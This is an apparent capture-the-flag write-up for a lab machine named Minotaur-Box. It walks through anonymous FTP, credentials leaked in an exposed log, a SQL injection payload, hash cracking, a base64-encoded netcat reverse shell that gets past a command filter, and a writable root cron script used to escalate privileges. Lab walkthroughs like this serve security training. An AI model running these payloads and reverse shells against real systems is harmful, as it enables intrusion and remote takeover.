# Writeup Minotaur-Box

## Nmap scan

```
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x   3 nobody   nogroup      4096 Jun 15 14:57 pub
80/tcp   open  http     Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
443/tcp  open  ssl/http Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
| ssl-cert: Subject: commonName=localhost/organizationName=Apache Friends/stateOrProvinceName=Berlin/countryName=DE
| Not valid before: 2004-10-01T09:10:30
|_Not valid after:  2010-09-30T09:10:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
```

## FTP Server
you see you can login into ftp anonymously

you see these files -> download them 

```
drwxr-xr-x   2 root     root         4096 Jun 15 19:49 .secret
-rw-r--r--   1 root     root          141 Jun 15 14:57 message.txt
```

if you cd to .secret you get the flag and a note with a hint for the future

```
└─# cat keep_in_mind.txt 
Not to forget, he forgets a lot of stuff, that's why he likes to keep things on a timer ... literally
-- Minotaur
```

## Web Server
lets focus on the web server now:
doing a quick dir-scan shows that the /logs dir is exposed to the public
you can find a post request log at http://[Machine_IP]/logs/post/post_log.log
where you can find a valid password and user name to login with
email=Daedalus&password=g2e55kh4ck5r

you get presented with an api interface where you can query for user data:
lets try quering for our user Daedalus
you will get back the name and hashed password of him
if you look at inspect element theres a hint hidden it tells you something about permissions ....

``` <!-- Minotaur!!! Told you not to keep permissions in the same shelf as all the others especially if the permission is equal to admin --> ```

if you look at the structure of the paramenters you see at the naming pattern (namePeoplenameCreature) there may be a parameter called permissionPeople
so lets try out an sql-injection with this information

``` Daedalus' OR permissionPeople='admin ```

you get this result gives you a new user: 

```5    M!n0taur    1765db9457f496a39859209ee81fbda4 ```

you can either crack this hash (rockyou list), or you can use a website like crackstation
now login with the new userinformation you got
user: M!n0taur password: aminotauro
and a link to an pannel called "secret echo pannel"
there you can echo some your input out witch internally executes the echo command but you somhow have to bypass the filters and gain RCE
when you find out `` is permitted and you execute commands with it (you have to execute them seperatly at ';' because this char is filterd )
the best way to bypass the filter is just with a base64 encoded reverse shell payload
```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4243 >/tmp/f ```
to this

```cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgWU9VUl9JUCA0MjQzID4vdG1wL2Y=```

since the equals sign is also filterd you will have to remove it witch leaves you with this payload
```echo "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgWU9VUl9JUCA0MjQzID4vdG1wL2Y" | base64 -d | bash```
then you get access to to machine and find the user flag located in /home/user/

## Machine 
you see theres cronjob running on a file owend by root(location: /timer/timer.sh) but wrteable by everyone
add your reverse shell (use a different port this time)
```rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4243 >/tmp/f```
the location of the root flag is in the root folder



